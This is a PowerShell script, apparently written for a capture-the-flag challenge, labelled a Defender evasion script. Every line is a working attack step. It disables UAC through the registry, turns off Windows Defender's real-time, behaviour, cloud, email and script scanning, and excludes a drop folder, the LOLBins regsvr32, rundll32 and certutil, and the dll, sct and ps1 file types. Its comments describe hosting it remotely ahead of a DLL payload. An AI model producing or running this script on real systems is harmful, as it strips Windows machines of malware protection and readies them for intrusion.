# sayonara.ps1 - Defender Evasion Script
# CyberSphere 2026 CTF - RaawR Challenge
# Host this at: https://raw.githubusercontent.com/sn0-0wyy/GetsugaTensho/main/sayonara.ps1

# Disable UAC (requires admin, takes effect after reboot)
$null = reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f 2>$null

# Disable Real-time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# Disable scanning for downloaded files or attachments (IOAV)
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

# Disable Behavior Monitoring (NOTE: American spelling, not British)
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue

# Disable Block at First Seen (cloud detection)
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue

# Disable Email Scanning
Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue

# Disable Script Scanning
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

# Add exclusion for C:\Users\Public (where DLL will be dropped)
Add-MpPreference -ExclusionPath "C:\Users\Public" -ErrorAction SilentlyContinue

# Add process exclusions for LOLBins we'll use
Add-MpPreference -ExclusionProcess "regsvr32.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "rundll32.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "certutil.exe" -ErrorAction SilentlyContinue

# Add extension exclusions
Set-MpPreference -ExclusionExtension "dll","sct","ps1" -ErrorAction SilentlyContinue

# Small delay to ensure all settings are applied
Start-Sleep -Seconds 3
